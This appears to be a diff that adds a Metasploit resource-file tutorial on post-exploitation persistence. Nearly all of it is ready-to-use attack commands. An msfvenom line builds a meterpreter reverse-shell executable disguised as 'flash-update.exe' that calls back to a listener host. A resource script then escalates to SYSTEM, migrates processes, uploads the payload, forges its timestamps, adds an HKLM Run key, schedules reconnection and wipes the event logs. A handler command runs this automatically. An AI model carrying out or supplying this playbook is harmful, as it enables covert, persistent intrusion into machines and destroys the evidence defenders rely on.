@@ -1,0 +1,53 @@
+                                              [ RC / ERB scripting lesson 5 ]
+ 
+ 
+ 
+                                                   exercise description:
+              The follow exercise explains how to use one resource file to 'persiste' one payload in target
+                at post-exploitation time using 'AutoRunScript' and 'multi_console_command' msf modules.
+
+              "Persistence.rc" resource file will "elevate session" to nt authority/system, "migrate" payload proccess
+              to wininit.exe, "upload" your payload to target system (temp folder), change "mace values" of payload,
+              set one registry key to start payload at "system startup" (HKLM), "schedule" payload to reconnect back
+              after 10 minuts, and clear target "event viewer" (logs msc console).
+
+
+
+
+              1º build one binary payload:
+              ---------------------------
+              msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=666 -f exe -o flash-update.exe
+
+
+              2º build "persistence.rc" resource file:
+              "open text editor and copy/paste"
+              ----------------------------------------
+              getsystem
+              run migrate -n explorer.exe
+              upload flash-update.exe %temp%\\flash-update.exe
+              timestomp -z '3/10/1999 15:15:15' %temp%\\flash-update.exe
+              reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\flash-update.exe
+              run scheduleme -m 10 -c "%temp%\\flash-update.exe"
+              clearev
+
+
+              3º start listenner (AutoRunScript):
+              -----------------------------------
+              msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.69; set LPORT 666; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc persistence.rc; exploit'
+
+
+              4º execute payload on target system:
+              -----------------------------------
+
+
+
+              5º clean things up in the end:
+              ------------------------------
+              meterpreter > exit
+              msf exploit(handler) > exit -y
+
+
+
+
+
+EOF
